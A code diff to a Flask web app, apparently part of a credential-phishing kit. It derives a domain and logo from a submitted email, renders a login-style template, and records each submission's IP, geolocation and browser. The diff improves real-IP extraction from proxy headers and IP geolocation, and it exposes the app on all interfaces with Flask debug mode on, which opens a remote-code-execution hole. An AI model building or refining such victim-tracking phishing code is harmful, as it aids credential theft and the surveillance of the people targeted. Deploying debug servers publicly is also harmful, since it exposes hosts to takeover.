@@ -39,14 +39,50 @@ def get_domain_from_email(email):
     return None
 
 def get_user_ip():
-    """Get user's IP address."""
-    return request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR', 'Unknown'))
+    """Get user's real IP address, handling proxies and local development."""
+    # Check for forwarded IP headers (when behind proxy/load balancer)
+    forwarded_ips = request.environ.get('HTTP_X_FORWARDED_FOR')
+    if forwarded_ips:
+        # X-Forwarded-For can contain multiple IPs, take the first (original client)
+        ip = forwarded_ips.split(',')[0].strip()
+        if ip and not ip.startswith('127.') and not ip.startswith('192.168.') and not ip.startswith('10.'):
+            return ip
+    
+    # Check other common proxy headers
+    real_ip = request.environ.get('HTTP_X_REAL_IP')
+    if real_ip and not real_ip.startswith('127.') and not real_ip.startswith('192.168.') and not real_ip.startswith('10.'):
+        return real_ip
+    
+    # Check Cloudflare specific header
+    cf_ip = request.environ.get('HTTP_CF_CONNECTING_IP')
+    if cf_ip and not cf_ip.startswith('127.') and not cf_ip.startswith('192.168.') and not cf_ip.startswith('10.'):
+        return cf_ip
+    
+    # Fall back to remote address
+    remote_addr = request.environ.get('REMOTE_ADDR', 'Unknown')
+    
+    # If we're getting localhost/private IPs, try to get public IP via external service
+    if remote_addr in ['127.0.0.1', 'localhost'] or remote_addr.startswith('192.168.') or remote_addr.startswith('10.'):
+        try:
+            # Get public IP from external service
+            response = requests.get('https://api.ipify.org', timeout=5)
+            if response.status_code == 200:
+                public_ip = response.text.strip()
+                return f"{public_ip} (via ipify - local detected: {remote_addr})"
+        except:
+            pass
+        return f"{remote_addr} (local/private network)"
+    
+    return remote_addr
 
 def get_location_from_ip(ip):
     """Get city and country from IP using ipapi.co (free service)."""
     try:
-        if ip and ip != 'Unknown' and not ip.startswith('127.') and not ip.startswith('192.168.'):
-            response = requests.get(f'http://ipapi.co/{ip}/json/', timeout=5)
+        # Extract just the IP if it contains additional info
+        clean_ip = ip.split(' ')[0] if ' ' in ip else ip
+        
+        if clean_ip and clean_ip != 'Unknown' and not clean_ip.startswith('127.') and not clean_ip.startswith('192.168.') and not clean_ip.startswith('10.'):
+            response = requests.get(f'http://ipapi.co/{clean_ip}/json/', timeout=5)
             if response.status_code == 200:
                 data = response.json()
                 city = data.get('city', 'Unknown')
@@ -54,7 +90,7 @@ def get_location_from_ip(ip):
                 return city, country
     except:
         pass
-    return 'Unknown', 'Unknown'
+    return 'Unknown (Local/Private Network)', 'Unknown (Local/Private Network)'
 
 def get_user_browser():
     """Get user's browser from User-Agent."""
@@ -185,4 +221,5 @@ Date of Submission: {timestamp}"""
     return render_template('he-opas.html', email=email, username=username, domain=domain, logo_url=logo_url, error=error)
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=True)
